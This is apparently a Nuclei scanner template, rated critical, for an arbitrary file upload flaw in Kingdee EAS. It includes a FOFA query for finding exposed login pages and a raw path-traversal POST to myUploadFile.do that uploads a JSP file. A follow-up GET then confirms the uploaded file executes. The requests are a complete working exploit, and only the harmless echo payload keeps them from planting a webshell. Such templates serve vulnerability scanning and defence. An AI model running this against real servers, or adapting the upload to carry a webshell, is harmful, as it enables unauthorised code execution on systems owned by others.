id: Kingdee-eas-myUploadFile-upload

info:
  name: Kingdee-eas-myUploadFile-upload
  author: Kingdee-eas-myUploadFile-upload
  severity: critical
  metadata: 
    fofa-query: app="Kingdee-EAS" web.title="EAS系统登录"
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
  file_content: "{{to_lower(rand_text_alpha(8))}}"

requests:
  - raw:
      - |
        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
        Connection: close
        Accept: */*
        Accept-Language: en
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
        Accept-Encoding: gzip, deflate
        Content-Length: 211

        ------WebKitFormBoundarySq4lDnabv8CwHfvx
        Content-Disposition: form-data; name="myFile"; filename="{{file_name}}"
        Content-Type: text/html

        <%out.println("{{file_content}}");%>
        ------WebKitFormBoundarySq4lDnabv8CwHfvx--

      - |
        GET /easportal/buffalo/../{{file_name}} HTTP/1.1
        Host: {{Hostname}}


    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "{{file_content}}")'
        condition: and